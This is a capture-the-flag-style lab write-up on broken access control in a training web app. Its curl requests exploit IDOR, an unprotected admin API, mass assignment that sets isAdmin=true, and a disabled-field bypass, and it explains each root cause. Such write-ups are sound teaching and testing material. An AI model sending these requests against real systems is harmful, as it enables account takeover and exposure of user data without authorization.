# HackSmarter – Chapter 9: Broken Access Control

## Objective
Identify and exploit broken authorization mechanisms in a vulnerable web application.

Focus Areas:
- Insecure Direct Object Reference (IDOR)
- Hidden Admin API exposure
- Mass Assignment privilege escalation
- Client-side control bypass

---

# Lab Environment

| Component | Details |
|------------|----------|
| OS | Windows 11 Canary |
| Linux | WSL2 Kali Linux |
| VPN | OpenVPN (tun0 lab network) |
| Browser | Firefox ESR |
| CLI Tools | curl, nmap |
| Proxy | Burp Suite (unstable under WSLg) |

---

# Network Setup

## Launch Kali
```bash
wsl -d kali-linux
```

## Connect VPN
```bash
sudo openvpn /mnt/c/Users/tmlyz/Downloads/foundations_of_web_a.ovpn
```

## Verify tunnel
```bash
ip -br a
```

Expected:
```
tun0   10.x.x.x/16
```

---

# 1️⃣ IDOR – Email Update

## Discovery

Hidden field in profile form:
```html
<input type="hidden" name="user_id" value="1">
```

Admin profile revealed:
```html
<input type="hidden" name="user_id" value="3">
```

## Exploit

Modified `user_id` parameter in POST request.

```bash
curl -X POST http://TARGET/profile \
  -H "Cookie: session=SESSION_VALUE" \
  -d "action=update_email&user_id=3&email=hacked@test.com"
```

## Impact

- Horizontal privilege escalation  
- Unauthorized modification of another user’s data  
- Missing object-level authorization  

---

# 2️⃣ Hidden Admin API – Broken Access Control

Admin dashboard source contained:

```javascript
fetch('/api/users/all')
```

## Vulnerable Endpoint

```
/api/users/all
```

## Test as normal user

```bash
curl http://TARGET/api/users/all
```

Returned full user directory → no role validation.

## Impact

- Sensitive user data exposure  
- Security through obscurity failure  
- Missing server-side role enforcement  

---

# 3️⃣ Mass Assignment – Privilege Escalation

Admin profile source revealed:

```html
<input type="hidden" name="isAdmin" value="true">
```

Backend accepted unfiltered parameters.

## Exploit

Injected:
```
isAdmin=true
```

```bash
curl -X POST http://TARGET/profile \
  -H "Cookie: session=TONY_SESSION" \
  -d "action=update_info&phone=555-0199&isAdmin=true"
```

## Result

Normal user promoted to Administrator.

## Root Cause

- No field whitelisting  
- Blind model binding  
- Server trusted client input  

---

# 4️⃣ Client-Side Control Bypass

Frontend restriction:

```html
<input name="username" value="tony" disabled="disabled">
```

Removed `disabled` attribute via browser DevTools and submitted modified username.

Server accepted update.

## Lesson

Client-side restrictions are cosmetic.  
Authorization must be enforced server-side.

---

# Burp Suite Issue (WSL + Canary)

Observed:

- GUI freezing  
- libEGL / MESA rendering warnings  
- Proxy tab instability  

Example error:
```
libEGL warning: failed to get driver name
MESA: error: ZINK: failed to choose pdev
```

## Workaround

- Used curl for request manipulation  
- Used view-source for recon  
- Extracted session cookies manually  

## Key Takeaway

Understanding HTTP > dependency on tools.

---

# Authorization Failures Observed

| Vulnerability | Root Cause |
|--------------|------------|
| IDOR | Missing ownership validation |
| Hidden API | Missing role enforcement |
| Mass Assignment | No attribute whitelisting |
| Username Bypass | Client-side trust |

---

# Conclusion

This lab demonstrated:

- Horizontal privilege escalation  
- Vertical privilege escalation  
- Sensitive data exposure  
- Improper server-side validation  

Authorization flaws remain among the most impactful web vulnerabilities.

Methodology-first testing proved more reliable than tool dependency.

